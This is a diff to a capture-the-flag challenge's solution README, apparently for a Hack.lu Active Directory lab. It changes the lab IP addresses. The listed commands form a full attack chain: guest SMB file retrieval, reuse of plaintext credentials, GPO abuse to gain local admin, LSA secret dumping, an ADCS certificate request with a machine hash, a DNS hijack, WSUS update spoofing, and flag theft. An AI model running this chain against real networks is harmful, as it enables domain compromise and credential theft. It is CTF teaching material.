@@ -13,25 +13,25 @@
 4. Auf `SRV02`: `$deploymentPassword = Read-Host 'svc_mdt password' -AsSecureString`; danach `.\Server.ps1 -Stage Configure -DeploymentPassword $deploymentPassword` ausführen. In beiden Schritten dasselbe Passwort eingeben.
 
 ### Commands
-1. `nxc smb 10.244.0.20 -u guest -p '' --share REMINST --get-file 'WdsClientUnattend\ImageUnattend.xml' ImageUnattend.xml`
-2. `nxc smb 10.244.0.20 -u svc_deploy -p 'D3pl0y!_AgileCorp'`
+1. `nxc smb 192.168.109.20 -u guest -p '' --share REMINST --get-file 'WdsClientUnattend\ImageUnattend.xml' ImageUnattend.xml`
+2. `nxc smb 192.168.109.20 -u svc_deploy -p 'D3pl0y!_AgileCorp'`
 3. `pipx inject netexec ldap3-bleeding-edge`
-4. `nxc ldap 10.244.0.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' --bloodhound -c all --dns-server 10.244.0.10`
-5. `pygpoabuse 'agile-corp.hacklu/svc_deploy:D3pl0y!_AgileCorp' -gpo-id "5889E490-F649-4B0C-AF73-5220803E133C" -dc-ip 10.244.0.10 -vv -command 'net localgroup "Administrators" "agile-corp.hacklu\svc_deploy" /add'`
-7. `nxc smb 10.244.0.20 -u svc_deploy -p 'D3pl0y!_AgileCorp' --lsa`
-8. `nxc ldap 10.244.0.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' -M certipy-find`
+4. `nxc ldap 192.168.109.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' --bloodhound -c all --dns-server 192.168.109.10`
+5. `pygpoabuse 'agile-corp.hacklu/svc_deploy:D3pl0y!_AgileCorp' -gpo-id "5889E490-F649-4B0C-AF73-5220803E133C" -dc-ip 192.168.109.10 -vv -command 'net localgroup "Administrators" "agile-corp.hacklu\svc_deploy" /add'`
+7. `nxc smb 192.168.109.20 -u svc_deploy -p 'D3pl0y!_AgileCorp' --lsa`
+8. `nxc ldap 192.168.109.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' -M certipy-find`
 9. Update WSUS DNS entry (first update hosts file): `nsupdate`
    1. `nsupdate`
    2. `server agile-corp.hacklu`
    3. `zone agile-corp.hacklu`
-   4. `update add wsus.agile-corp.hacklu. 86400 A 10.244.0.137`
+   4. `update add wsus.agile-corp.hacklu. 86400 A 192.168.109.137`
    5. `update delete wsus.agile-corp.hacklu. A 192.168.108.10`
    6. `send`
-10. `certipy req -dc-ip 10.244.0.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
+10. `certipy req -dc-ip 192.168.109.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
 11. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
 12. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only`
 13. Wait up to 1 minute for WSUS updates on the DC.
-14. `nxc smb 10.244.0.10 -u user89834 -p 'mlOwZvWq9sb31!' --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
+14. `nxc smb 192.168.109.10 -u user89834 -p 'mlOwZvWq9sb31!' --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
 
 
 #### Manual invocations
